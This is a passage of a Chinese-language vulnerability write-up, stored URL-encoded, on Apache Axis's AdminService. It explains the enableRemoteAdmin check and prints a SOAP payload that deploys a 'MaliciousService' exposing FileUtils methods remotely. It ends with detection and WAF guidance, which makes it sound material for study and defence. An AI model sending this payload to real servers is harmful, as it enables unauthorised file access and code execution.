nt%3E%0A%20%20%20%3C%2Fsoapenv%3ABody%3E%0A%3C%2Fsoapenv%3AEnvelope%3E%0A%60%60%60%0A%0A%23%23%203.3%20%E5%A6%82%E4%BD%95%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%0A%E6%A0%B9%E6%8D%AEwebservice%E7%9C%8B%E4%B8%8B%E4%BB%A3%E7%A0%81%E3%80%82%0A%0A!%5B1970e109ec0ae1795ceacffd77ec703b.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp736)%0A%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%92%8C%E5%89%8D%E9%9D%A2%E7%9A%84server-config.wsdd%E6%96%87%E4%BB%B6%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%EF%BC%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%96%87%E4%BB%B6%E6%98%AForg.apache.axis.utils.Admin.java%EF%BC%8C%E6%96%B9%E6%B3%95%E6%98%AFAdminService%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%E3%80%82%0A!%5B6975be2e56f02d4a44116360baff4c3f.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp737)%0A%0A!%5B2e7973090a07403bc01e23584b54d94c.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp738)%0A%E5%9C%A8process%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%E4%B8%AD%E8%B0%83%E7%94%A8%E4%BA%86%E6%9F%A5%E7%9C%8B%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AFserver-config.wsdd%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%B0%86enableRemoteAdmin%E8%AE%BE%E7%BD%AE%E4%B8%BAtrue%EF%BC%8C%E5%A6%82%E6%9E%9C%E4%B8%BAfalse%EF%BC%8C%E4%BC%9A%E9%AA%8C%E8%AF%81%E8%AF%B7%E6%B1%82%E7%9A%84IP%E6%98%AF%E5%90%A6%E4%B8%BA%E6%9C%AC%E5%9C%B0IP%EF%BC%8C%E4%B8%8D%E6%98%AF%E7%9A%84%E8%AF%9D%EF%BC%8C%E4%BC%9A%E6%8A%9B%E5%87%BA%E5%BC%82%E5%B8%B8%E3%80%82%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%EF%BC%8C%E5%BD%93%E6%B2%A1%E6%9C%89%E6%BC%8F%E6%B4%9E%E6%97%B6%EF%BC%8Cresponse%E9%87%8C%E6%9C%89%E6%AD%A4%E7%89%B9%E5%BE%81%E3%80%82%EF%BC%88%E5%B0%B1%E6%98%AF%E4%B8%8A%E9%9D%A2%E6%8F%90%E5%88%B0%E7%9A%84%E9%BB%91%E7%9B%92%E6%A3%80%E6%B5%8B%E6%97%B6%E6%97%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%89%B9%E5%BE%81%EF%BC%89%0A!%5Bef1e8b84c36674c3a44b969bbc8c0779.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp739)%0A%0A%E7%BB%A7%E7%BB%AD%E8%B7%9F%E8%BF%9BprocessWSDD%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%E3%80%82%0A%0A!%5Bf958762380b3e60a0c2ffe2227c289e6.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp740)%0A%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E8%BF%99%E4%B8%AA%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E6%A0%B9%E6%8D%AErequest%E9%87%8C%E9%9D%A2%E7%9A%84xml%E5%86%85%E5%AE%B9%E7%94%9F%E6%88%90%E6%96%B0%E7%9A%84webservice%E3%80%82%E5%9B%A0%E6%AD%A4%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E6%A0%B9%E6%8D%AEWSDDocument%E8%BF%99%E4%B8%AA%E7%B1%BB%E6%9D%A5%E7%94%9F%E6%88%90%E5%8F%AF%E4%BB%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84payload%E3%80%82%0A%0A!%5B6eb71cd5ec221c254c1528fa2578c0c4.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp741)%0A%0A%E4%BE%8B%E5%A6%82%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%B0%86org.apache.commons.io.FileUtils%E7%94%9F%E6%88%90webservice%EF%BC%8C%E4%BB%8E%E8%80%8C%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E5%85%B6%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95%E3%80%82%0A%0A%60%60%60%0A%3Csoapenv%3AEnvelope%20xmlns%3Asoapenv%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%20xmlns%3Awsdd%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%0A%20%20%20%3Csoapenv%3AHeader%2F%3E%0A%20%20%20%3Csoapenv%3ABody%3E%0A%20%20%20%20%20%3Cns1%3Adeployment%0A%20%20%20%20%20%20%20%20%20%20%20%20xmlns%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%0A%20%20%20%20%20%20%20%20%20%20%20%20xmlns%3Ajava%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2Fproviders%2Fjava%22%0A%20%20%20%20%20%20%20%20%20%20%20%20xmlns%3Ans1%3D%22http%3A%2F%2Fxml.apache.org%2Faxis%2Fwsdd%2F%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cns1%3Aservice%20name%3D%22MaliciousService%22%20provider%3D%22java%3ARPC%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cns1%3Aparameter%20name%3D%22className%22%20value%3D%22org.apache.commons.io.FileUtils%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cns1%3Aparameter%20name%3D%22allowedMethods%22%20value%3D%22*%22%2F%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fns1%3Aservice%3E%0A%20%20%20%20%20%20%20%20%3C%2Fns1%3Adeployment%3E%0A%20%20%20%3C%2Fsoapenv%3ABody%3E%0A%3C%2Fsoapenv%3AEnvelope%3E%0A%60%60%60%0A!%5Baeff67b186a19584412549262c5cb083.jpeg%5D(evernotecid%3A%2F%2F2E1BAD57-F770-4075-BE9B-B86D1A898CDE%2Fappyinxiangcom%2F19663684%2FENResource%2Fp742)%0A%0A%E8%87%B3%E6%AD%A4%EF%BC%8C%E5%88%86%E6%9E%90%E5%AE%8C%E6%88%90%EF%BC%8C%E8%BF%99%E9%87%8C%E6%B2%A1%E5%86%99%E6%83%85%E6%8A%A5%E9%87%8C%E8%AF%B4%E7%9A%84%E5%88%A9%E7%94%A8freemarker%E8%BF%9B%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%9C%8B%E3%80%82%E5%85%B6%E5%AE%9E%E5%8E%9F%E7%90%86%E4%B8%80%E6%A0%B7%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%88%A9%E7%94%A8payload%E7%9A%84%E4%BE%9D%E8%B5%96%E4%B8%8D%E4%B8%80%E6%A0%B7%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%B0%86freemarker%E9%87%8C%E9%9D%A2%E7%9B%B8%E5%85%B3%E7%9A%84%E7%B1%BB%E7%94%9F%E6%88%90webservice%E3%80%82%E6%97%B6%E9%97%B4%E6%9C%89%E9%99%90%EF%BC%8C%E6%84%9F%E5%85%B4%E8%B6%A3%E8%87%AA%E8%A1%8C%E5%88%86%E6%9E%90%E3%80%82%0A%0A%23%204%E3%80%81%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1%0A%E8%BF%99%E9%87%8C%E7%AE%80%E5%8D%95%E5%86%99%E5%88%B0%E5%A6%82%E4%BD%95%E6%A3%80%E6%B5%8B%E3%80%82%0A%0A%E7%99%BD%E7%9B%92%EF%BC%9A%E5%85%A8%E5%B1%80%E6%A3%80%E6%B5%8B%E4%BB%A3%E7%A0%81%EF%BC%8CenableRemoteAdmin%E6%98%AF%E5%90%A6%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BAtrue%E3%80%82%0A%E9%BB%91%E7%9B%92%EF%BC%9A%E8%A7%81poc%E3%80%82%0A%E6%B5%81%E9%87%8F%E4%B8%8EWAF%EF%BC%9A%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%9C%89%2Faxis%2Fservices%2FAdminService%E8%AE%BF%E9%97%AE%E8%AE%B0%E5%BD%95%EF%BC%8C%E6%8A%A5%E8%AD%A6%E3%80%82%E5%BD%93%E7%84%B6%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%90%8C%E6%97%B6%E5%8C%B9%E9%85%8Dresponse%E6%98%AF%E5%90%A6%E6%9C%89%E6%88%90%E5%8A%9F%E7%89%B9%E5%BE%81%E3%80%82%0A%0A%E6%9C%AC%E4%BA%BA%E6%B0%B4%E5%B9%B3%E6%9C%89%E9%99%90%EF%BC%8C%E6%97%B6%E9%97%B4%E5%8C%86%E5%BF%99%EF%BC%8C%E5%A6%82%E6%9C%89%E9%94%99%E8%AF%AF%E6%88%96%E8%80%85%E4%B8%8D%E5%BD%93%E6%8C%87%E5%87%BA%EF%BC%8C%E8%BF%98%E8%AF%B7%E4%B8%8D%E5%90%9D%E6%8C%87%E6%AD%A3%E3%80%82</center></body></html>